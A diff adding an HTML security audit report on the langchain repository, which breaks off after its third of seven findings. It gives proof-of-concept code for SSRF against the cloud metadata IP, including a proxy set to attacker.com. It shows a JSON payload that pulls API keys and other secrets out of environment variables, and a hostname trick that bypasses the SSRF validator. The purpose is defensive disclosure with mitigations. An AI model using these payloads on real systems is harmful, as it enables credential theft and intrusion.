@@ -1,0 +1,1001 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Security Report — langchain</title>
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+    :root {
+      --bg: #0b0e18;
+      --surface: #111827;
+      --surface2: #1a2235;
+      --border: #1f2d45;
+      --text: #e2e8f0;
+      --muted: #64748b;
+      --accent: #6366f1;
+      --red: #ef4444;
+      --orange: #f97316;
+      --yellow: #eab308;
+      --green: #22c55e;
+      --blue: #3b82f6;
+      --purple: #a855f7;
+    }
+    body { font-family: 'Segoe UI', system-ui, -apple-system, sans-serif; background: var(--bg); color: var(--text); line-height: 1.65; font-size: 15px; }
+    a { color: var(--blue); text-decoration: none; }
+    a:hover { text-decoration: underline; }
+    code, pre { font-family: 'JetBrains Mono', 'Fira Code', 'Cascadia Code', 'Consolas', monospace; }
+
+    .topbar { position: sticky; top: 0; z-index: 100; background: #080b14ee; backdrop-filter: blur(12px); border-bottom: 1px solid var(--border); display: flex; align-items: center; justify-content: space-between; padding: 0 40px; height: 56px; }
+    .topbar .brand { font-weight: 700; font-size: 0.95rem; color: var(--text); letter-spacing: 0.03em; }
+    .topbar .repo-tag { font-size: 0.8rem; color: var(--muted); font-family: monospace; }
+
+    .hero { background: linear-gradient(160deg, #0f172a 0%, #1a0a2e 50%, #0f1a2e 100%); padding: 60px 60px 50px; border-bottom: 1px solid var(--border); }
+    .hero h1 { font-size: 2.2rem; font-weight: 800; color: #f8fafc; letter-spacing: -0.02em; }
+    .hero .repo-url { color: var(--accent); font-size: 0.9rem; margin-top: 6px; font-family: monospace; }
+    .hero-meta { display: flex; gap: 28px; margin-top: 22px; flex-wrap: wrap; font-size: 0.82rem; color: var(--muted); }
+    .hero-meta span strong { color: #94a3b8; }
+
+    .badge { display: inline-flex; align-items: center; padding: 2px 10px; border-radius: 999px; font-size: 0.72rem; font-weight: 700; letter-spacing: 0.05em; text-transform: uppercase; }
+    .badge-critical { background: #3b0764; color: #e879f9; border: 1px solid #581c87; }
+    .badge-high     { background: #450a0a; color: #f87171; border: 1px solid #7f1d1d; }
+    .badge-medium   { background: #431407; color: #fb923c; border: 1px solid #7c2d12; }
+    .badge-low      { background: #14532d; color: #4ade80; border: 1px solid #166534; }
+    .badge-info     { background: #1e3a5f; color: #60a5fa; border: 1px solid #1d4ed8; }
+    .badge-dep      { background: #312e81; color: #a5b4fc; border: 1px solid #3730a3; }
+
+    .stats { display: flex; gap: 0; border-bottom: 1px solid var(--border); overflow-x: auto; }
+    .stat { flex: 1; min-width: 140px; padding: 28px 32px; border-right: 1px solid var(--border); background: var(--surface); }
+    .stat:last-child { border-right: none; }
+    .stat .s-label { font-size: 0.7rem; text-transform: uppercase; letter-spacing: 0.1em; color: var(--muted); margin-bottom: 8px; }
+    .stat .s-value { font-size: 2rem; font-weight: 800; line-height: 1; }
+    .stat .s-value.red    { color: var(--red); }
+    .stat .s-value.orange { color: var(--orange); }
+    .stat .s-value.yellow { color: var(--yellow); }
+    .stat .s-value.green  { color: var(--green); }
+    .stat .s-value.purple { color: var(--purple); }
+    .stat .s-value.blue   { color: var(--blue); }
+
+    .layout { display: flex; min-height: calc(100vh - 56px); }
+    .sidebar { width: 280px; min-width: 280px; background: var(--surface); border-right: 1px solid var(--border); padding: 24px 0; position: sticky; top: 56px; height: calc(100vh - 56px); overflow-y: auto; }
+    .sidebar .s-title { font-size: 0.65rem; text-transform: uppercase; letter-spacing: 0.12em; color: var(--muted); padding: 0 20px 10px; }
+    .sidebar-item { display: block; padding: 8px 20px; font-size: 0.82rem; color: #94a3b8; cursor: pointer; border-left: 3px solid transparent; transition: all 0.15s; }
+    .sidebar-item:hover { background: var(--surface2); color: var(--text); border-left-color: var(--accent); }
+    .sidebar-item .si-id { font-family: monospace; font-size: 0.75rem; color: var(--muted); }
+    .sidebar-item .si-title { display: block; font-size: 0.8rem; margin-top: 2px; white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
+
+    .main { flex: 1; padding: 40px 50px; min-width: 0; }
+    .section-heading { font-size: 0.7rem; text-transform: uppercase; letter-spacing: 0.12em; color: var(--muted); padding-bottom: 12px; border-bottom: 1px solid var(--border); margin: 48px 0 24px; }
+    .section-heading:first-child { margin-top: 0; }
+
+    .finding { background: var(--surface); border: 1px solid var(--border); border-radius: 14px; margin-bottom: 24px; overflow: hidden; transition: border-color 0.2s; }
+    .finding:hover { border-color: #334155; }
+    .finding-header { display: flex; justify-content: space-between; align-items: flex-start; padding: 20px 24px; gap: 16px; }
+    .finding-header-left { flex: 1; min-width: 0; }
+    .finding-id { font-family: monospace; font-size: 0.72rem; color: var(--accent); font-weight: 700; margin-bottom: 4px; }
+    .finding-title { font-size: 1.05rem; font-weight: 600; color: #f1f5f9; }
+    .finding-type  { font-size: 0.78rem; color: var(--muted); margin-top: 4px; }
+    .finding-body { padding: 0 24px 24px; border-top: 1px solid var(--border); }
+
+    .meta-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(180px, 1fr)); gap: 12px; padding: 18px 0; }
+    .meta-item { background: var(--surface2); border-radius: 8px; padding: 10px 14px; }
+    .meta-item .m-label { font-size: 0.65rem; text-transform: uppercase; letter-spacing: 0.1em; color: var(--muted); margin-bottom: 4px; }
+    .meta-item .m-value { font-size: 0.88rem; font-weight: 600; color: #e2e8f0; }
+    .meta-item .m-value.mono { font-family: monospace; font-size: 0.72rem; }
+
+    .dataflow { background: #0d1117; border: 1px solid #21262d; border-left: 3px solid var(--accent); border-radius: 0 8px 8px 0; padding: 14px 18px; margin: 16px 0; font-size: 0.85rem; color: #c9d1d9; }
+
+    .code-wrap { margin: 16px 0; border-radius: 10px; overflow: hidden; border: 1px solid #21262d; }
+    .code-header { background: #161b27; padding: 8px 16px; display: flex; justify-content: space-between; align-items: center; }
+    .code-header .file-path { font-family: monospace; font-size: 0.75rem; color: #6366f1; }
+    .code-header .line-ref  { font-family: monospace; font-size: 0.72rem; color: var(--muted); }
+    .code-body { background: #0d1117; overflow-x: auto; }
+    .code-body pre { padding: 16px; font-size: 0.8rem; color: #c9d1d9; line-height: 1.6; white-space: pre; tab-size: 2; }
+
+    .steps-list { list-style: none; counter-reset: steps; margin: 12px 0; }
+    .steps-list li { counter-increment: steps; display: flex; gap: 14px; margin-bottom: 10px; }
+    .steps-list li::before { content: counter(steps); min-width: 26px; height: 26px; background: var(--surface2); border: 1px solid var(--border); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 0.75rem; font-weight: 700; color: var(--accent); flex-shrink: 0; }
+    .steps-list li span { color: #cbd5e1; font-size: 0.88rem; padding-top: 3px; }
+
+    .poc-block { background: #070d1a; border: 1px solid #1a2540; border-radius: 8px; padding: 14px 18px; margin: 12px 0; }
+    .poc-block .poc-label { font-size: 0.65rem; text-transform: uppercase; letter-spacing: 0.1em; color: #475569; margin-bottom: 8px; font-weight: 700; }
+    .poc-block pre { font-size: 0.8rem; color: #7dd3fc; white-space: pre-wrap; word-break: break-all; }
+
+    .impact-block { background: #1c0a0a; border-left: 3px solid var(--red); border-radius: 0 8px 8px 0; padding: 14px 18px; margin: 14px 0; }
+    .impact-block .block-label { font-size: 0.65rem; text-transform: uppercase; letter-spacing: 0.1em; color: #ef4444; font-weight: 700; margin-bottom: 6px; }
+    .impact-block p { font-size: 0.88rem; color: #fca5a5; }
+    .mitig-block { background: #052e16; border-left: 3px solid var(--green); border-radius: 0 8px 8px 0; padding: 14px 18px; margin: 14px 0; }
+    .mitig-block .block-label { font-size: 0.65rem; text-transform: uppercase; letter-spacing: 0.1em; color: #22c55e; font-weight: 700; margin-bottom: 6px; }
+    .mitig-block p { font-size: 0.88rem; color: #86efac; }
+    .mitig-block pre { font-size: 0.78rem; color: #86efac; background: #031a0d; padding: 10px 14px; border-radius: 6px; margin-top: 10px; white-space: pre-wrap; }
+
+    .field-label { font-size: 0.7rem; text-transform: uppercase; letter-spacing: 0.1em; color: var(--muted); font-weight: 700; margin: 18px 0 8px; }
+    .field-text  { font-size: 0.88rem; color: #cbd5e1; }
+
+    .dep-card { background: var(--surface); border: 1px solid var(--border); border-radius: 12px; margin-bottom: 16px; overflow: hidden; }
+    .dep-card-header { display: flex; justify-content: space-between; align-items: center; padding: 16px 20px; background: var(--surface2); }
+    .dep-card-header .pkg-name { font-family: monospace; font-size: 0.95rem; color: #e2e8f0; font-weight: 600; }
+    .dep-card-body { padding: 16px 20px; }
+    .dep-meta { display: flex; gap: 20px; flex-wrap: wrap; margin-bottom: 12px; font-size: 0.82rem; color: var(--muted); }
+    .dep-meta span strong { color: #94a3b8; }
+    .dep-explanation { font-size: 0.87rem; color: #94a3b8; margin-bottom: 12px; }
+    .dep-mitigation { background: #052e16; border-left: 3px solid var(--green); border-radius: 0 6px 6px 0; padding: 10px 14px; font-size: 0.84rem; color: #86efac; }
+
+    .footer { background: var(--surface); border-top: 1px solid var(--border); padding: 28px 60px; display: flex; justify-content: space-between; align-items: center; font-size: 0.78rem; color: var(--muted); flex-wrap: wrap; gap: 12px; }
+    .footer strong { color: #94a3b8; }
+
+    .exp-banner { display: inline-flex; align-items: center; gap: 8px; padding: 5px 12px; border-radius: 6px; font-size: 0.78rem; font-weight: 600; margin-bottom: 16px; }
+    .exp-confirmed { background: #450a0a; color: #f87171; border: 1px solid #7f1d1d; }
+    .exp-likely    { background: #431407; color: #fb923c; border: 1px solid #7c2d12; }
+    .exp-uncertain { background: #1c1917; color: #a8a29e; border: 1px solid #44403c; }
+
+    @media (max-width: 900px) {
+      .layout { flex-direction: column; }
+      .sidebar { width: 100%; position: static; height: auto; }
+      .main { padding: 24px 20px; }
+      .hero { padding: 32px 20px; }
+      .stats { flex-wrap: wrap; }
+    }
+  </style>
+</head>
+<body>
+
+<nav class="topbar">
+  <span class="brand">Security Audit Report</span>
+  <span class="repo-tag">github.com/langchain-ai/langchain @ 29134dc</span>
+</nav>
+
+<div class="hero">
+  <h1>langchain</h1>
+  <div class="repo-url">https://github.com/langchain-ai/langchain</div>
+  <div class="hero-meta">
+    <span><strong>Branch:</strong> master</span>
+    <span><strong>Commit:</strong> 29134dc82dcb71fa693e57231bcc10f78a1b0c2b</span>
+    <span><strong>Commit Date:</strong> 2026-03-07</span>
+    <span><strong>Primary Language:</strong> Python</span>
+    <span><strong>Files Scanned:</strong> 2,448 Python source files</span>
+    <span><strong>Scan Date:</strong> 2026-03-07</span>
+  </div>
+</div>
+
+<div class="stats">
+  <div class="stat"><div class="s-label">Total Findings</div><div class="s-value blue">7</div></div>
+  <div class="stat"><div class="s-label">Critical</div><div class="s-value purple">0</div></div>
+  <div class="stat"><div class="s-label">High</div><div class="s-value red">2</div></div>
+  <div class="stat"><div class="s-label">Medium</div><div class="s-value orange">4</div></div>
+  <div class="stat"><div class="s-label">Low</div><div class="s-value green">1</div></div>
+  <div class="stat"><div class="s-label">Dep Confusion</div><div class="s-value purple">0</div></div>
+</div>
+
+<div class="layout">
+
+  <aside class="sidebar">
+    <div class="s-title">Findings</div>
+
+    <a class="sidebar-item" href="#VULN-1">
+      <span class="si-id">VULN-1 · <span class="badge badge-high">High</span></span>
+      <span class="si-title">SSRF via Unvalidated base_url in Mermaid PNG</span>
+    </a>
+    <a class="sidebar-item" href="#VULN-2">
+      <span class="si-id">VULN-2 · <span class="badge badge-high">High</span></span>
+      <span class="si-title">Env Var Exfiltration via JSON Deserialization</span>
+    </a>
+    <a class="sidebar-item" href="#VULN-3">
+      <span class="si-id">VULN-3 · <span class="badge badge-medium">Medium</span></span>
+      <span class="si-title">SSRF Protection Bypass via LANGCHAIN_ENV</span>
+    </a>
+    <a class="sidebar-item" href="#VULN-4">
+      <span class="si-id">VULN-4 · <span class="badge badge-medium">Medium</span></span>
+      <span class="si-title">Jinja2 Sandbox Escape (Best-Effort Only)</span>
+    </a>
+    <a class="sidebar-item" href="#VULN-5">
+      <span class="si-id">VULN-5 · <span class="badge badge-medium">Medium</span></span>
+      <span class="si-title">Arbitrary File Read via Prompt Config</span>
+    </a>
+    <a class="sidebar-item" href="#VULN-6">
+      <span class="si-id">VULN-6 · <span class="badge badge-medium">Medium</span></span>
+      <span class="si-title">ReDoS in FilesystemFileSearchMiddleware</span>
+    </a>
+    <a class="sidebar-item" href="#VULN-7">
+      <span class="si-id">VULN-7 · <span class="badge badge-low">Low</span></span>
+      <span class="si-title">SHA-1 Collision Cache Poisoning in Indexing API</span>
+    </a>
+
+    <div class="s-title" style="margin-top:24px">Dep Confusion</div>
+    <a class="sidebar-item" href="#dep-confusion">
+      <span class="si-title">0 packages flagged</span>
+    </a>
+  </aside>
+
+  <main class="main">
+
+    <div class="section-heading">Code Vulnerabilities</div>
+
+    <!-- ═══ VULN-1 ═══ -->
+    <div class="finding" id="VULN-1">
+      <div class="finding-header">
+        <div class="finding-header-left">
+          <div class="finding-id">VULN-1</div>
+          <div class="finding-title">Server-Side Request Forgery (SSRF) via Unvalidated <code>base_url</code> in Mermaid PNG Rendering</div>
+          <div class="finding-type">SSRF — Partial-URL / Full-URL</div>
+        </div>
+        <span class="badge badge-high">High</span>
+      </div>
+      <div class="finding-body">
+
+        <div class="exp-banner exp-likely">LIKELY — Direct path from caller-supplied parameter to outbound HTTP request; no SSRF validation applied</div>
+
+        <div class="meta-grid">
+          <div class="meta-item"><div class="m-label">Auth Required</div><div class="m-value">None</div></div>
+          <div class="meta-item"><div class="m-label">CVSS Score</div><div class="m-value">7.5</div></div>
+          <div class="meta-item"><div class="m-label">CVSS Vector</div><div class="m-value mono">CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N</div></div>
+          <div class="meta-item"><div class="m-label">References</div><div class="m-value">CWE-918</div></div>
+        </div>
+
+        <div class="field-label">Summary</div>
+        <div class="field-text">
+          The <code>draw_mermaid_png()</code> function in <code>graph_mermaid.py</code> accepts a caller-supplied <code>base_url</code> parameter that is used without any SSRF validation to construct and execute an outbound HTTP GET request. The URL is formed as <code>{base_url}/img/{mermaid_b64}?type=...&amp;bgColor=...</code> and fetched with <code>requests.get()</code>. If an application surfaces this parameter to users (e.g., in a LangGraph graph-visualization endpoint), an attacker can redirect the server to make requests to internal services, including cloud metadata endpoints (AWS IMDSv1 at <code>169.254.169.254</code>), internal databases, or other private hosts. The rest of the codebase has a robust <code>validate_safe_url()</code> SSRF guard, but it is never called here. Additionally, the <code>proxies</code> parameter is passed unvalidated to <code>requests.get()</code>, allowing an attacker to control the HTTP proxy.
+        </div>
+
+        <div class="field-label">Data Flow (Source → Sink)</div>
+        <div class="dataflow">
+          <strong>Source:</strong> <code>draw_mermaid_png(mermaid_syntax, base_url=&lt;attacker_value&gt;)</code> (caller-controlled parameter) →<br>
+          <strong>Propagation:</strong> <code>_render_mermaid_using_api(mermaid_syntax, base_url=base_url)</code> (line 320) →<br>
+          <code>image_url = f"{base_url}/img/{mermaid_syntax_encoded}?type=...&amp;bgColor=..."</code> (lines 440–443) →<br>
+          <strong>Sink:</strong> <code>requests.get(image_url, timeout=10, proxies=proxies)</code> (line 456)
+        </div>
+
+        <div class="field-label">Vulnerable Code</div>
+        <div class="code-wrap">
+          <div class="code-header">
+            <span class="file-path">libs/core/langchain_core/runnables/graph_mermaid.py</span>
+            <span class="line-ref">Lines 405–456</span>
+          </div>
+          <div class="code-body"><pre>def _render_mermaid_using_api(
+    mermaid_syntax: str,
+    *,
+    output_file_path: str | None = None,
+    background_color: str | None = "white",
+    file_type: Literal["jpeg", "png", "webp"] | None = "png",
+    max_retries: int = 1,
+    retry_delay: float = 1.0,
+    proxies: dict[str, str] | None = None,
+    base_url: str | None = None,     # &lt;-- attacker-controlled
+) -> bytes:
+    # Defaults to using the public mermaid.ink server.
+    base_url = base_url if base_url is not None else "https://mermaid.ink"
+
+    # ... (no SSRF validation on base_url) ...
+
+    mermaid_syntax_encoded = base64.b64encode(mermaid_syntax.encode("utf8")).decode("ascii")
+
+    image_url = (
+        f"{base_url}/img/{mermaid_syntax_encoded}"    # &lt;-- tainted URL
+        f"?type={file_type}&amp;bgColor={encoded_bg_color}"
+    )
+
+    for attempt in range(max_retries + 1):
+        response = requests.get(image_url, timeout=10, proxies=proxies)  # &lt;-- SSRF sink</pre></div>
+        </div>
+
+        <div class="field-label">Steps to Reproduce</div>
+        <ol class="steps-list">
+          <li><span>Identify an application that calls <code>draw_mermaid_png()</code> and forwards user-supplied input into the <code>base_url</code> or <code>proxies</code> parameter (e.g., a graph visualization API endpoint).</span></li>
+          <li><span>Supply <code>base_url="http://169.254.169.254/latest/meta-data"</code> as the parameter value.</span></li>
+          <li><span>The server issues <code>GET http://169.254.169.254/latest/meta-data/img/&lt;b64&gt;?type=png&amp;bgColor=...</code>.</span></li>
+          <li><span>The AWS IMDSv1 metadata endpoint ignores the path suffix and returns instance metadata. The server's response body (if reflected) contains cloud credentials.</span></li>
+        </ol>
+
+        <div class="field-label">Proof of Concept</div>
+        <div class="poc-block">
+          <div class="poc-label">Python call / HTTP equivalent</div>
+          <pre># Direct API call (attacker controls base_url)
+from langchain_core.runnables.graph_mermaid import draw_mermaid_png
+png_bytes = draw_mermaid_png(
+    mermaid_syntax="graph TD; A-->B",
+    base_url="http://169.254.169.254/latest/meta-data",
+    # Server will GET: http://169.254.169.254/latest/meta-data/img/Z3JhcGg...
+)
+# Response body = AWS instance metadata (credentials, IAM role ARN, etc.)
+
+# Alternatively, via proxy parameter to SSRF internal network:
+png_bytes = draw_mermaid_png(
+    mermaid_syntax="graph TD; A-->B",
+    proxies={"http": "http://attacker.com:8080"},  # intercept/redirect all traffic
+)</pre>
+        </div>
+
+        <div class="impact-block">
+          <div class="block-label">Impact</div>
+          <p>An attacker can exfiltrate cloud provider credentials (AWS/GCP/Azure IAM tokens) from instance metadata services, enumerate internal network services, or pivot to internal APIs. If the <code>proxies</code> vector is used, all outbound HTTP traffic can be redirected to an attacker-controlled host, enabling credential interception and further lateral movement.</p>
+        </div>
+
+        <div class="mitig-block">
+          <div class="block-label">Mitigation</div>
+          <p>Apply the existing <code>validate_safe_url()</code> SSRF guard to <code>base_url</code> before constructing the final URL. The codebase already contains this utility in <code>langchain_core._security._ssrf_protection</code>.</p>
+          <pre>from langchain_core._security._ssrf_protection import validate_safe_url
+
+def _render_mermaid_using_api(mermaid_syntax, *, base_url=None, **kwargs):
+    base_url = base_url if base_url is not None else "https://mermaid.ink"
+    # Validate base_url for SSRF before use
+    validate_safe_url(base_url, allow_private=False, allow_http=False)
+    # ... rest of function</pre>
+        </div>
+
+      </div>
+    </div>
+
+    <!-- ═══ VULN-2 ═══ -->
+    <div class="finding" id="VULN-2">
+      <div class="finding-header">
+        <div class="finding-header-left">
+          <div class="finding-id">VULN-2</div>
+          <div class="finding-title">Arbitrary Environment Variable Exfiltration via JSON Deserialization (<code>secrets_from_env=True</code>)</div>
+          <div class="finding-type">Insecure Deserialization — Environment Variable Injection</div>
+        </div>
+        <span class="badge badge-high">High</span>
+      </div>
+      <div class="finding-body">
+
+        <div class="exp-banner exp-likely">LIKELY — Requires secrets_from_env=True (non-default) but enables complete env var exfiltration via crafted JSON payload</div>
+
+        <div class="meta-grid">
+          <div class="meta-item"><div class="m-label">Auth Required</div><div class="m-value">Varies</div></div>
+          <div class="meta-item"><div class="m-label">CVSS Score</div><div class="m-value">8.1</div></div>
+          <div class="meta-item"><div class="m-label">CVSS Vector</div><div class="m-value mono">CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:N</div></div>
+          <div class="meta-item"><div class="m-label">References</div><div class="m-value">CWE-502, CWE-200</div></div>
+        </div>
+
+        <div class="field-label">Summary</div>
+        <div class="field-text">
+          The <code>Reviver.__call__</code> method in <code>load.py</code> processes JSON objects with <code>{"lc": 1, "type": "secret", "id": ["ENV_VAR_NAME"]}</code> structure. When the caller has set <code>secrets_from_env=True</code>, it will read <em>any</em> environment variable named in <code>id[0]</code> and return it as a plain string. This means a crafted deserialization payload can silently exfiltrate arbitrary env vars — API keys, database passwords, tokens — from the process environment. While the default is <code>False</code>, many real applications enable this feature to wire serialized chain configs to their secret stores. The documentation warns about this but the warning is buried in docstrings.
+        </div>
+
+        <div class="field-label">Data Flow (Source → Sink)</div>
+        <div class="dataflow">
+          <strong>Source:</strong> Attacker-controlled JSON string, e.g.: <code>'{"lc":1,"type":"secret","id":["OPENAI_API_KEY"]}'</code> →<br>
+          <strong>Propagation:</strong> <code>loads(text, secrets_from_env=True)</code> → <code>json.loads(text, object_hook=Reviver(secrets_from_env=True))</code> →<br>
+          <strong>Sink:</strong> <code>Reviver.__call__</code> line 416: <code>if self.secrets_from_env and key in os.environ: return os.environ[key]</code> → returns secret value in plaintext
+        </div>
+
+        <div class="field-label">Vulnerable Code</div>
+        <div class="code-wrap">
+          <div class="code-header">
+            <span class="file-path">libs/core/langchain_core/load/load.py</span>
+            <span class="line-ref">Lines 408–418</span>
+          </div>
+          <div class="code-body"><pre>if (
+    value.get("lc") == 1
+    and value.get("type") == "secret"
+    and value.get("id") is not None
+):
+    [key] = value["id"]                          # key is attacker-controlled env var name
+    if key in self.secrets_map:
+        return self.secrets_map[key]
+    if self.secrets_from_env and key in os.environ and os.environ[key]:
+        return os.environ[key]                   # &lt;-- reads arbitrary env var
+    return None</pre></div>
+        </div>
+
+        <div class="field-label">Steps to Reproduce</div>
+        <ol class="steps-list">
+          <li><span>Find an application that calls <code>loads()</code> or <code>load()</code> with <code>secrets_from_env=True</code> and processes any portion of attacker-controlled input.</span></li>
+          <li><span>Inject the following JSON payload into the deserialized data stream: <code>{"lc": 1, "type": "secret", "id": ["OPENAI_API_KEY"]}</code></span></li>
+          <li><span>The return value of <code>loads()</code> (or the field where the secret was embedded) will contain the value of <code>os.environ["OPENAI_API_KEY"]</code>.</span></li>
+          <li><span>If the application returns or logs the deserialized value, the secret is exfiltrated. Repeat with any env var name (e.g., <code>DATABASE_URL</code>, <code>AWS_SECRET_ACCESS_KEY</code>).</span></li>
+        </ol>
+
+        <div class="field-label">Proof of Concept</div>
+        <div class="poc-block">
+          <div class="poc-label">Python PoC</div>
+          <pre>import os
+from langchain_core.load import loads
+
+# Simulate environment (attacker targets any real secret name)
+os.environ["OPENAI_API_KEY"] = "sk-real-secret-key-here"
+
+# Attacker-crafted payload targeting env var exfiltration
+malicious_payload = '{"lc": 1, "type": "secret", "id": ["OPENAI_API_KEY"]}'
+
+# Application calls loads() with secrets_from_env=True
+result = loads(malicious_payload, secrets_from_env=True)
+print(result)  # Output: "sk-real-secret-key-here"
+
+# Works for any env var:
+for target in ["AWS_SECRET_ACCESS_KEY", "DATABASE_URL", "ANTHROPIC_API_KEY"]:
+    payload = f'{{"lc": 1, "type": "secret", "id": ["{target}"]}}'
+    leaked = loads(payload, secrets_from_env=True)
+    if leaked:
+        print(f"Exfiltrated {target}: {leaked}")</pre>
+        </div>
+
+        <div class="impact-block">
+          <div class="block-label">Impact</div>
+          <p>Complete exfiltration of any environment variable in the application process, including API keys (OpenAI, Anthropic, AWS), database connection strings, JWT signing secrets, and OAuth client credentials. In a multi-tenant environment, a single attacker request can harvest all secrets used by the application.</p>
+        </div>
+
+        <div class="mitig-block">
+          <div class="block-label">Mitigation</div>
+          <p>Keep <code>secrets_from_env=False</code> (the default). If env-var secrets are necessary, use a restrictive allowlist via <code>secrets_map</code> instead — explicitly map only the secret names the serialized object legitimately needs. Add a deprecation warning or removal timeline for <code>secrets_from_env</code>.</p>
+          <pre># SAFE: Use explicit secrets_map instead of secrets_from_env
+result = loads(
+    payload,
+    secrets_map={"OPENAI_API_KEY": os.environ.get("OPENAI_API_KEY")},
+    secrets_from_env=False,  # Never enable this for untrusted data
+)</pre>
+        </div>
+
+      </div>
+    </div>
+
+    <!-- ═══ VULN-3 ═══ -->
+    <div class="finding" id="VULN-3">
+      <div class="finding-header">
+        <div class="finding-header-left">
+          <div class="finding-id">VULN-3</div>
+          <div class="finding-title">SSRF Protection Bypass via <code>LANGCHAIN_ENV=local_test</code> — Breaks "Always-Block" Cloud Metadata Guarantee</div>
+          <div class="finding-type">SSRF Bypass — Environment Variable Configuration</div>
+        </div>
+        <span class="badge badge-medium">Medium</span>
+      </div>
+      <div class="finding-body">
+
+        <div class="exp-banner exp-uncertain">UNCERTAIN — Requires LANGCHAIN_ENV=local_test to be set in the environment; real-world exploitability depends on deployment configuration</div>
+
+        <div class="meta-grid">
+          <div class="meta-item"><div class="m-label">Auth Required</div><div class="m-value">None (env misconfig)</div></div>
+          <div class="meta-item"><div class="m-label">CVSS Score</div><div class="m-value">6.5</div></div>
+          <div class="meta-item"><div class="m-label">CVSS Vector</div><div class="m-value mono">CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:N/A:N</div></div>
+          <div class="meta-item"><div class="m-label">References</div><div class="m-value">CWE-918, CWE-807</div></div>
+        </div>
+
+        <div class="field-label">Summary</div>
+        <div class="field-text">
+          The <code>validate_safe_url()</code> function in <code>_ssrf_protection.py</code> contains a test-mode bypass (lines 198–203). When <code>LANGCHAIN_ENV=local_test</code>, any URL whose hostname starts with <code>"test"</code> and contains <code>"server"</code> is returned immediately — <strong>before</strong> the cloud metadata endpoint check on line 206. The comment on line 205 states "ALWAYS block cloud metadata endpoints (even with allow_private=True)" but this guarantee is broken by the earlier return. An attacker who can influence the <code>LANGCHAIN_ENV</code> environment variable (through a misconfigured Docker environment, environment variable injection, or a CI/CD pipeline that runs in production mode with test env vars) can submit a URL like <code>http://testserver.169.254.169.254.nip.io/latest/meta-data/</code> and bypass all SSRF protections.
+        </div>
+
+        <div class="field-label">Data Flow (Source → Sink)</div>
+        <div class="dataflow">
+          <strong>Source:</strong> <code>os.environ.get("LANGCHAIN_ENV") == "local_test"</code> AND attacker-controlled <code>url</code> with hostname starting with "test" and containing "server" (e.g., <code>testserver.169.254.169.254.nip.io</code>) →<br>
+          <strong>Bypass:</strong> Lines 198–203 return the URL <em>before</em> cloud-metadata hostname check on line 206 →<br>
+          <strong>Sink:</strong> Caller proceeds to make HTTP request to cloud metadata endpoint
+        </div>
+
+        <div class="field-label">Vulnerable Code</div>
+        <div class="code-wrap">
+          <div class="code-header">
+            <span class="file-path">libs/core/langchain_core/_security/_ssrf_protection.py</span>
+            <span class="line-ref">Lines 196–212</span>
+          </div>
+          <div class="code-body"><pre># Special handling for test environments - allow test server hostnames
+# testserver is used by FastAPI/Starlette test clients and doesn't resolve via DNS
+# Only enabled when LANGCHAIN_ENV=local_test (set in conftest.py)
+if (
+    os.environ.get("LANGCHAIN_ENV") == "local_test"
+    and hostname.startswith("test")     # matches "testserver", "test.example.com", etc.
+    and "server" in hostname            # also matches "testserver.169.254.169.254.nip.io"
+):
+    return url_str  # &lt;-- RETURNS HERE, before cloud metadata check below!
+
+# ALWAYS block cloud metadata endpoints (even with allow_private=True)
+# &lt;--- This guarantee is broken when the block above triggers
+if is_cloud_metadata(hostname):
+    msg = f"Cloud metadata endpoints are not allowed: {hostname}"
+    raise ValueError(msg)</pre></div>
+        </div>
+
+        <div class="field-label">Steps to Reproduce</div>
+        <ol class="steps-list">
+          <li><span>Ensure <code>LANGCHAIN_ENV=local_test</code> is set in the process environment (this happens automatically when LangChain tests run; it may persist in misconfigured deployments).</span></li>
+          <li><span>Call <code>validate_safe_url("http://testserver.169.254.169.254.nip.io/latest/meta-data/")</code> — hostname = <code>testserver.169.254.169.254.nip.io</code>, which starts with "test" and contains "server".</span></li>
+          <li><span>The function returns the URL without blocking it.</span></li>
+          <li><span>The caller proceeds to fetch the URL, which resolves (via nip.io or a similarly crafted DNS) to the cloud metadata IP <code>169.254.169.254</code>.</span></li>
+        </ol>
+
+        <div class="field-label">Proof of Concept</div>
+        <div class="poc-block">
+          <div class="poc-label">Python PoC (with LANGCHAIN_ENV=local_test set)</div>
+          <pre>import os
+os.environ["LANGCHAIN_ENV"] = "local_test"  # set by conftest.py during tests
+
+from langchain_core._security._ssrf_protection import validate_safe_url
+
+# This should raise ValueError but doesn't when LANGCHAIN_ENV=local_test
+# Hostname: "testserver.169.254.169.254.nip.io"
+# - starts with "test" ✓
+# - contains "server" ✓
+# - resolves to 169.254.169.254 (AWS metadata IP)
+result = validate_safe_url("http://testserver.169.254.169.254.nip.io/")
+print(f"URL passed SSRF validation: {result}")  # Should have been blocked!</pre>
+        </div>
+
+        <div class="impact-block">
+          <div class="block-label">Impact</div>
+          <p>If <code>LANGCHAIN_ENV=local_test</code> is set in production (a common misconfiguration in containerized deployments where test scripts are run alongside production), SSRF protection against cloud metadata services is completely bypassed for matching hostnames. This enables credential theft from IMDS endpoints on AWS, GCP, and Azure.</p>
+        </div>
+
+        <div class="mitig-block">
+          <div class="block-label">Mitigation</div>
+          <p>Move the cloud metadata check <em>before</em> the test-environment bypass, or explicitly perform the cloud metadata check even in test mode. The "ALWAYS block" comment must be enforced in code, not just documentation.</p>
+          <pre>def validate_safe_url(url, *, allow_private=False, allow_http=True):
+    ...
+    hostname = parsed.hostname
+
+    # ALWAYS block cloud metadata — check BEFORE any test-mode bypass
+    if is_cloud_metadata(hostname):
+        raise ValueError(f"Cloud metadata endpoints are not allowed: {hostname}")
+
+    # Test-mode bypass (only after cloud metadata is confirmed safe)
+    if (
+        os.environ.get("LANGCHAIN_ENV") == "local_test"
+        and hostname.startswith("test")
+        and "server" in hostname
+    ):
+        return url_str
+    ...</pre>
+        </div>
+
+      </div>
+    </div>
+
+    <!-- ═══ VULN-4 ═══ -->
+    <div class="finding" id="VULN-4">
+      <div class="finding-header">
+        <div class="finding-header-left">
+          <div class="finding-id">VULN-4</div>
